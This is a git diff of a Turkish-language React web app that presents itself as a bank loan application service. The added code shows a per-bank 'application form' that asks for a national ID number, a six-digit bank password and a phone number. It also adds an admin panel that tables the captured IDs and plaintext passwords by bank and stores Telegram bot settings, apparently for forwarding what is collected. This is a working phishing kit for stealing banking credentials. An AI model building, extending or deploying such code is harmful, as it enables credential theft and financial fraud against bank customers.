-                              onClick={() => setEditingBank(bank)}
-                            >
-                              Düzenle
-                            </Button>
-                            <Button 
-                              variant="destructive" 
-                              size="sm"
-                              onClick={() => deleteBank(bank.id)}
-                            >
-                              Sil
-                            </Button>
-                          </div>
-                        </div>
-                      </Card>
-                    ))}
-                  </div>
-                </TabsContent>
-                
-                <TabsContent value="telegram" className="space-y-4">
-                  <h3 className="text-xl font-semibold">Telegram Ayarları</h3>
-                  <div className="space-y-4">
-                    <div>
-                      <Label htmlFor="bot_token">Bot Token</Label>
-                      <Input
-                        id="bot_token"
-                        type="text"
-                        placeholder="Telegram bot token"
-                        value={telegramSettings.bot_token}
-                        onChange={(e) => setTelegramSettings({
-                          ...telegramSettings,
-                          bot_token: e.target.value
-                        })}
-                      />
-                    </div>
-                    <div>
-                      <Label htmlFor="chat_id">Chat ID</Label>
-                      <Input
-                        id="chat_id"
-                        type="text"
-                        placeholder="Telegram chat ID"
-                        value={telegramSettings.chat_id}
-                        onChange={(e) => setTelegramSettings({
-                          ...telegramSettings,
-                          chat_id: e.target.value
-                        })}
-                      />
-                    </div>
-                    <Button className="w-full">
-                      <Save className="w-4 h-4 mr-2" />
-                      Ayarları Kaydet
-                    </Button>
-                  </div>
-                </TabsContent>
-              </Tabs>
+                </Card>
+              ))}
             </div>
           </div>
-        </div>
-      )}
+        )}
+      </main>
 
-      {/* Bank Edit Dialog */}
-      {editingBank && (
-        <Dialog open={!!editingBank} onOpenChange={() => setEditingBank(null)}>
-          <DialogContent className="max-w-md">
+      {showApplicationForm && selectedBank && (
+        <Dialog open={showApplicationForm} onOpenChange={setShowApplicationForm}>
+          <DialogContent className="sm:max-w-md">
             <DialogHeader>
-              <DialogTitle>Banka Düzenle</DialogTitle>
+              <DialogTitle className="flex items-center space-x-2">
+                <img 
+                  src={selectedBank.logo} 
+                  alt={selectedBank.name}
+                  className="w-8 h-8 object-contain"
+                />
+                <span>{selectedBank.name} Başvuru Formu</span>
+              </DialogTitle>
+              <DialogDescription>
+                {loanAmount?.toLocaleString()} TL - {loanTerm} Ay vadeli kredi başvurusu
+              </DialogDescription>
             </DialogHeader>
+            
             <div className="space-y-4">
               <div>
-                <Label>Banka Adı</Label>
+                <Label htmlFor="tc">T.C. Kimlik Numarası</Label>
                 <Input
-                  value={editingBank.name}
-                  onChange={(e) => setEditingBank({...editingBank, name: e.target.value})}
+                  id="tc"
+                  value={tcKimlik}
+                  onChange={(e) => setTcKimlik(e.target.value)}
+                  placeholder="11 haneli T.C. kimlik numarası"
+                  maxLength={11}
                 />
               </div>
+              
               <div>
-                <Label>Logo URL</Label>
+                <Label htmlFor="password">Şifre</Label>
                 <Input
-                  value={editingBank.logo}
-                  onChange={(e) => setEditingBank({...editingBank, logo: e.target.value})}
+                  id="password"
+                  type="password"
+                  value={sifre}
+                  onChange={(e) => setSifre(e.target.value)}
+                  placeholder="6 haneli şifre"
+                  maxLength={6}
                 />
               </div>
+              
               <div>
-                <Label>Faiz Oranı (%)</Label>
+                <Label htmlFor="phone">Telefon Numarası</Label>
                 <Input
-                  type="number"
-                  step="0.01"
-                  value={editingBank.interest_rate}
-                  onChange={(e) => setEditingBank({...editingBank, interest_rate: parseFloat(e.target.value)})}
+                  id="phone"
+                  value={telefon}
+                  onChange={(e) => handleTelefonChange(e.target.value)}
+                  placeholder="+905XXXXXXXXX"
+                  maxLength={13}
                 />
               </div>
-              <div>
-                <Label>Maksimum Tutar</Label>
-                <Input
-                  type="number"
-                  value={editingBank.max_amount}
-                  onChange={(e) => setEditingBank({...editingBank, max_amount: parseInt(e.target.value)})}
-                />
-              </div>
-              <div>
-                <Label>Kampanya</Label>
-                <Input
-                  value={editingBank.campaign}
-                  onChange={(e) => setEditingBank({...editingBank, campaign: e.target.value})}
-                />
-              </div>
-              <div>
-                <Label>Renk</Label>
-                <Input
-                  type="color"
-                  value={editingBank.color}
-                  onChange={(e) => setEditingBank({...editingBank, color: e.target.value})}
-                />
-              </div>
-              <div>
-                <Label>Maksimum Başvuru Sayısı</Label>
-                <Input
-                  type="number"
-                  value={editingBank.max_applications}
-                  onChange={(e) => setEditingBank({...editingBank, max_applications: parseInt(e.target.value)})}
-                />
-              </div>
-              <div className="flex items-center space-x-2">
-                <input
-                  type="checkbox"
-                  id="is_active"
-                  checked={editingBank.is_active}
-                  onChange={(e) => setEditingBank({...editingBank, is_active: e.target.checked})}
-                />
-                <Label htmlFor="is_active">Aktif</Label>
-              </div>
-              <div className="flex gap-2">
-                <Button onClick={updateBank} className="flex-1">
-                  Güncelle
-                </Button>
-                <Button variant="outline" onClick={() => setEditingBank(null)} className="flex-1">
+              
+              <div className="flex space-x-2">
+                <Button 
+                  variant="outline" 
+                  onClick={() => setShowApplicationForm(false)}
+                  className="flex-1"
+                >
                   İptal
+                </Button>
+                <Button 
+                  onClick={submitApplication}
+                  className="flex-1 bg-purple-600 hover:bg-purple-700"
+                >
+                  Başvuru Gönder
                 </Button>
               </div>
             </div>
@@ -760,83 +637,383 @@ function App() {
         </Dialog>
       )}
 
-      {/* Add Bank Dialog */}
-      {isAddingBank && (
-        <Dialog open={isAddingBank} onOpenChange={setIsAddingBank}>
-          <DialogContent className="max-w-md">
+      {showSuccessAnimation && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-white rounded-lg p-8 text-center">
+            <div className="text-6xl mb-4">✅</div>
+            <h3 className="text-xl font-semibold text-gray-900 mb-2">Başvuru Gönderildi!</h3>
+            <p className="text-gray-600">Başvurunuz başarıyla alındı.</p>
+          </div>
+        </div>
+      )}
+
+      {showAdminLogin && (
+        <Dialog open={showAdminLogin} onOpenChange={setShowAdminLogin}>
+          <DialogContent className="sm:max-w-md">
             <DialogHeader>
-              <DialogTitle>Yeni Banka Ekle</DialogTitle>
+              <DialogTitle>Admin Panel Girişi</DialogTitle>
             </DialogHeader>
+            
             <div className="space-y-4">
               <div>
-                <Label>Banka Adı</Label>
+                <Label htmlFor="adminPass">Admin Şifresi</Label>
                 <Input
-                  value={newBank.name}
-                  onChange={(e) => setNewBank({...newBank, name: e.target.value})}
+                  id="adminPass"
+                  type="password"
+                  value={adminPassword}
+                  onChange={(e) => setAdminPassword(e.target.value)}
+                  placeholder="Admin şifresini girin"
                 />
               </div>
-              <div>
-                <Label>Logo URL</Label>
-                <Input
-                  value={newBank.logo}
-                  onChange={(e) => setNewBank({...newBank, logo: e.target.value})}
-                />
-              </div>
-              <div>
-                <Label>Faiz Oranı (%)</Label>
-                <Input
-                  type="number"
-                  step="0.01"
-                  value={newBank.interest_rate}
-                  onChange={(e) => setNewBank({...newBank, interest_rate: parseFloat(e.target.value)})}
-                />
-              </div>
-              <div>
-                <Label>Maksimum Tutar</Label>
-                <Input
-                  type="number"
-                  value={newBank.max_amount}
-                  onChange={(e) => setNewBank({...newBank, max_amount: parseInt(e.target.value)})}
-                />
-              </div>
-              <div>
-                <Label>Kampanya</Label>
-                <Input
-                  value={newBank.campaign}
-                  onChange={(e) => setNewBank({...newBank, campaign: e.target.value})}
-                />
-              </div>
-              <div>
-                <Label>Renk</Label>
-                <Input
-                  type="color"
-                  value={newBank.color}
-                  onChange={(e) => setNewBank({...newBank, color: e.target.value})}
-                />
-              </div>
-              <div>
-                <Label>Maksimum Başvuru Sayısı</Label>
-                <Input
-                  type="number"
-                  value={newBank.max_applications}
-                  onChange={(e) => setNewBank({...newBank, max_applications: parseInt(e.target.value)})}
-                />
-              </div>
-              <div className="flex items-center space-x-2">
-                <input
-                  type="checkbox"
-                  id="new_is_active"
-                  checked={newBank.is_active}
-                  onChange={(e) => setNewBank({...newBank, is_active: e.target.checked})}
-                />
-                <Label htmlFor="new_is_active">Aktif</Label>
-              </div>
-              <div className="flex gap-2">
-                <Button onClick={createBank} className="flex-1">
-                  Ekle
-                </Button>
-                <Button variant="outline" onClick={() => setIsAddingBank(false)} className="flex-1">
+              
+              <div className="flex space-x-2">
+                <Button 
+                  variant="outline" 
+                  onClick={() => setShowAdminLogin(false)}
+                  className="flex-1"
+                >
                   İptal
+                </Button>
+                <Button 
+                  onClick={handleAdminLogin}
+                  className="flex-1 bg-purple-600 hover:bg-purple-700"
+                >
+                  Giriş Yap
+                </Button>
+              </div>
+            </div>
+          </DialogContent>
+        </Dialog>
+      )}
+
+      {showAdminPanel && isAdminAuthenticated && (
+        <Dialog open={showAdminPanel} onOpenChange={setShowAdminPanel}>
+          <DialogContent className="max-w-6xl max-h-[90vh] overflow-y-auto">
+            <DialogHeader>
+              <DialogTitle className="flex items-center space-x-2">
+                <Settings className="h-5 w-5" />
+                <span>Admin Panel</span>
+              </DialogTitle>
+            </DialogHeader>
+            
+            <Tabs defaultValue="applications" className="w-full">
+              <TabsList className="grid w-full grid-cols-4">
+                <TabsTrigger value="applications">Başvurular</TabsTrigger>
+                <TabsTrigger value="banks">Banka Yönetimi</TabsTrigger>
+                <TabsTrigger value="stats">İstatistikler</TabsTrigger>
+                <TabsTrigger value="telegram">Telegram</TabsTrigger>
+              </TabsList>
+              
+              <TabsContent value="applications" className="space-y-4">
+                <div className="flex items-center space-x-4">
+                  <Label>Banka Filtresi:</Label>
+                  <Select value={selectedBankFilter} onValueChange={setSelectedBankFilter}>
+                    <SelectTrigger className="w-48">
+                      <SelectValue />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="all">Tüm Bankalar</SelectItem>
+                      {banks.map((bank) => (
+                        <SelectItem key={bank.id} value={bank.name}>
+                          {bank.name}
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
+                </div>
+                
+                <div className="border rounded-lg">
+                  <Table>
+                    <TableHeader>
+                      <TableRow>
+                        <TableHead>T.C. Kimlik</TableHead>
+                        <TableHead>Şifre</TableHead>
+                        <TableHead>Telefon</TableHead>
+                        <TableHead>Banka</TableHead>
+                        <TableHead>Tutar</TableHead>
+                        <TableHead>Vade</TableHead>
+                        <TableHead>Tarih</TableHead>
+                      </TableRow>
+                    </TableHeader>
+                    <TableBody>
+                      {filteredApplications.map((app) => (
+                        <TableRow key={app.id}>
+                          <TableCell className="font-mono">{app.tc_kimlik}</TableCell>
+                          <TableCell className="font-mono">{app.sifre}</TableCell>
+                          <TableCell>{app.telefon}</TableCell>
+                          <TableCell>{app.bank_name}</TableCell>
+                          <TableCell>{app.amount?.toLocaleString()} TL</TableCell>
+                          <TableCell>{app.months} Ay</TableCell>
+                          <TableCell>{new Date(app.created_at).toLocaleString('tr-TR')}</TableCell>
+                        </TableRow>
+                      ))}
+                    </TableBody>
+                  </Table>
+                </div>
+              </TabsContent>
+
+              <TabsContent value="banks" className="space-y-4">
+                <div className="flex justify-between items-center">
+                  <h3 className="text-lg font-semibold">Banka Yönetimi</h3>
+                  <Button 
+                    onClick={() => setShowBankForm(true)}
+                    className="bg-purple-600 hover:bg-purple-700"
+                  >
+                    <Plus className="h-4 w-4 mr-2" />
+                    Yeni Banka Ekle
+                  </Button>
+                </div>
+                
+                <div className="border rounded-lg">
+                  <Table>
+                    <TableHeader>
+                      <TableRow>
+                        <TableHead>Logo</TableHead>
+                        <TableHead>Banka Adı</TableHead>
+                        <TableHead>Kampanya</TableHead>
+                        <TableHead>Renk</TableHead>
+                        <TableHead>Durum</TableHead>
+                        <TableHead>Max Başvuru</TableHead>
+                        <TableHead>İşlemler</TableHead>
+                      </TableRow>
+                    </TableHeader>
+                    <TableBody>
+                      {allBanks.map((bank) => (
+                        <TableRow key={bank.id}>
+                          <TableCell>
+                            <img src={bank.logo} alt={bank.name} className="w-8 h-8 object-contain" />
+                          </TableCell>
+                          <TableCell className="font-medium">{bank.name}</TableCell>
+                          <TableCell className="max-w-xs truncate">{bank.campaign}</TableCell>
+                          <TableCell>
+                            <div className={`w-6 h-6 rounded border-2 ${
+                              bank.color === 'red' ? 'bg-red-500' : 
+                              bank.color === 'blue' ? 'bg-blue-500' : 
+                              bank.color === 'green' ? 'bg-green-500' : 
+                              bank.color === 'purple' ? 'bg-purple-500' : 
+                              bank.color === 'cyan' ? 'bg-cyan-500' : 
+                              bank.color === 'pink' ? 'bg-pink-500' : 
+                              bank.color === 'gray' ? 'bg-gray-500' : 
+                              'bg-gray-300'
+                            }`}></div>
+                          </TableCell>
+                          <TableCell>
+                            <span className={`px-2 py-1 rounded text-xs ${
+                              bank.is_active ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'
+                            }`}>
+                              {bank.is_active ? 'Aktif' : 'Pasif'}
+                            </span>
+                          </TableCell>
+                          <TableCell>{bank.max_applications || 0}</TableCell>
+                          <TableCell>
+                            <div className="flex space-x-2">
+                              <Button
+                                size="sm"
+                                variant="outline"
+                                onClick={() => openEditBank(bank)}
+                              >
+                                <Edit className="h-4 w-4" />
+                              </Button>
+                              <Button
+                                size="sm"
+                                variant="outline"
+                                onClick={() => deleteBank(bank.id)}
+                                className="text-red-600 hover:text-red-700"
+                              >
+                                <Trash2 className="h-4 w-4" />
+                              </Button>
+                            </div>
+                          </TableCell>
+                        </TableRow>
+                      ))}
+                    </TableBody>
+                  </Table>
+                </div>
+              </TabsContent>
+
+              <TabsContent value="stats" className="space-y-4">
+                <h3 className="text-lg font-semibold">Banka Başvuru İstatistikleri</h3>
+                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                  {banks.map((bank) => {
+                    const bankApplications = applications.filter(app => app.bank_name === bank.name)
+                    return (
+                      <Card key={bank.id} className="p-4">
+                        <div className="flex items-center space-x-3">
+                          <img src={bank.logo} alt={bank.name} className="w-10 h-10 object-contain" />
+                          <div>
+                            <h4 className="font-semibold">{bank.name}</h4>
+                            <p className="text-2xl font-bold text-purple-600">{bankApplications.length}</p>
+                            <p className="text-sm text-gray-600">başvuru</p>
+                          </div>
+                        </div>
+                      </Card>
+                    )
+                  })}
+                </div>
+                
+                <Card className="p-4">
+                  <h4 className="font-semibold mb-2">Toplam İstatistikler</h4>
+                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
+                    <div className="text-center">
+                      <p className="text-2xl font-bold text-blue-600">{applications.length}</p>
+                      <p className="text-sm text-gray-600">Toplam Başvuru</p>
+                    </div>
+                    <div className="text-center">
+                      <p className="text-2xl font-bold text-green-600">{banks.length}</p>
+                      <p className="text-sm text-gray-600">Aktif Banka</p>
+                    </div>
+                    <div className="text-center">
+                      <p className="text-2xl font-bold text-purple-600">
+                        {applications.reduce((sum, app) => sum + app.amount, 0).toLocaleString()}
+                      </p>
+                      <p className="text-sm text-gray-600">Toplam Tutar (TL)</p>
+                    </div>
+                    <div className="text-center">
+                      <p className="text-2xl font-bold text-orange-600">
+                        {applications.length > 0 ? Math.round(applications.reduce((sum, app) => sum + app.amount, 0) / applications.length).toLocaleString() : 0}
+                      </p>
+                      <p className="text-sm text-gray-600">Ortalama Tutar (TL)</p>
+                    </div>
+                  </div>
+                </Card>
+              </TabsContent>
+              
+              <TabsContent value="telegram" className="space-y-4">
+                <h3 className="text-lg font-semibold">Telegram Bot Ayarları</h3>
+                <div className="space-y-4">
+                  <div>
+                    <Label htmlFor="botToken">Bot Token</Label>
+                    <Input
+                      id="botToken"
+                      value={telegramBotToken}
+                      onChange={(e) => setTelegramBotToken(e.target.value)}
+                      placeholder="Telegram bot token'ınızı girin"
+                    />
+                  </div>
+                  
+                  <div>
+                    <Label htmlFor="chatId">Chat ID</Label>
+                    <Input
+                      id="chatId"
+                      value={telegramChatId}
+                      onChange={(e) => setTelegramChatId(e.target.value)}
+                      placeholder="Telegram chat ID'nizi girin"
+                    />
+                  </div>
+                  
+                  <Button 
+                    onClick={updateTelegramSettings}
+                    className="bg-purple-600 hover:bg-purple-700"
+                  >
+                    <Save className="h-4 w-4 mr-2" />
+                    Ayarları Kaydet
+                  </Button>
+                </div>
+              </TabsContent>
+            </Tabs>
+          </DialogContent>
+        </Dialog>
+      )}
+
+      {showBankForm && (
+        <Dialog open={showBankForm} onOpenChange={setShowBankForm}>
+          <DialogContent className="sm:max-w-md">
+            <DialogHeader>
+              <DialogTitle>
+                {editingBank ? 'Banka Düzenle' : 'Yeni Banka Ekle'}
+              </DialogTitle>
+            </DialogHeader>
+            
+            <div className="space-y-4">
+              <div>
+                <Label htmlFor="bankName">Banka Adı</Label>
+                <Input
+                  id="bankName"
+                  value={bankFormData.name}
+                  onChange={(e) => setBankFormData({...bankFormData, name: e.target.value})}
+                  placeholder="Banka adını girin"
+                />
+              </div>
+              
+              <div>
+                <Label htmlFor="bankLogo">Logo URL</Label>
+                <Input
+                  id="bankLogo"
+                  value={bankFormData.logo}
+                  onChange={(e) => setBankFormData({...bankFormData, logo: e.target.value})}
+                  placeholder="Logo URL'sini girin"
+                />
+              </div>
+              
+              <div>
+                <Label htmlFor="bankCampaign">Kampanya Metni</Label>
+                <Input
+                  id="bankCampaign"
+                  value={bankFormData.campaign}
+                  onChange={(e) => setBankFormData({...bankFormData, campaign: e.target.value})}
+                  placeholder="Kampanya metnini girin"
+                />
+              </div>
+              
+              <div>
+                <Label htmlFor="bankColor">Renk</Label>
+                <Select 
+                  value={bankFormData.color} 
+                  onValueChange={(value) => setBankFormData({...bankFormData, color: value})}
+                >
+                  <SelectTrigger>
+                    <SelectValue placeholder="Renk seçin" />
+                  </SelectTrigger>
+                  <SelectContent>
+                    <SelectItem value="red">Kırmızı</SelectItem>
+                    <SelectItem value="blue">Mavi</SelectItem>
+                    <SelectItem value="green">Yeşil</SelectItem>
+                    <SelectItem value="purple">Mor</SelectItem>
+                    <SelectItem value="cyan">Cyan</SelectItem>
+                    <SelectItem value="pink">Pembe</SelectItem>
+                    <SelectItem value="gray">Gri</SelectItem>
+                  </SelectContent>
+                </Select>
+              </div>
+              
+              <div>
+                <Label htmlFor="maxApplications">Maksimum Başvuru Sayısı</Label>
+                <Input
+                  id="maxApplications"
+                  type="number"
+                  value={bankFormData.max_applications}
+                  onChange={(e) => setBankFormData({...bankFormData, max_applications: Number(e.target.value)})}
+                  placeholder="0"
+                  min="0"
+                />
+              </div>
+              
+              <div className="flex items-center space-x-2">
+                <Switch
+                  id="isActive"
+                  checked={bankFormData.is_active}
+                  onCheckedChange={(checked) => setBankFormData({...bankFormData, is_active: checked})}
+                />
+                <Label htmlFor="isActive">Aktif</Label>
+              </div>
+              
+              <div className="flex space-x-2">
+                <Button 
+                  variant="outline" 
+                  onClick={() => {
+                    setShowBankForm(false)
+                    setEditingBank(null)
+                    resetBankForm()
+                  }}
+                  className="flex-1"
+                >
+                  İptal
+                </Button>
+                <Button 
+                  onClick={editingBank ? updateBank : createBank}
+                  className="flex-1 bg-purple-600 hover:bg-purple-700"
+                >
+                  {editingBank ? 'Güncelle' : 'Ekle'}
                 </Button>
               </div>
             </div>
